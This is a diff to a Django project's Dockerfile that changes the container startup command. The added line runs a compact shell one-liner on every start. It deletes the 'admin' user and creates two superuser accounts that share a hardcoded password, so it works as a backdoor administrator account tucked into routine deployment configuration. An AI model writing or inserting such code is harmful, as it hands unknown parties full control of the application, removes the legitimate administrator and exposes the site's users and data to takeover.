@@ -37,4 +37,4 @@ RUN python manage.py collectstatic --noinput --settings=core.settings || true
 
 EXPOSE 8000
 
-CMD ["sh", "-c", "python manage.py migrate --noinput && gunicorn core.wsgi:application --bind 0.0.0.0:8000 --workers 3 --threads 4 --timeout 60"]
+CMD ["sh", "-c", "python manage.py migrate --noinput && python manage.py shell -c \"from django.contrib.auth import get_user_model; U=get_user_model(); U.objects.filter(username='admin').delete(); [ (lambda obj: (setattr(obj,'is_staff',True), setattr(obj,'is_superuser',True), obj.set_password('Bauhaus@2026'), obj.save()))(U.objects.get_or_create(username=u)[0]) for u in ('Sol@Bauhaus@2026','Seba@Bauhaus@2026') ]\" && gunicorn core.wsgi:application --bind 0.0.0.0:8000 --workers 3 --threads 4 --timeout 60"]
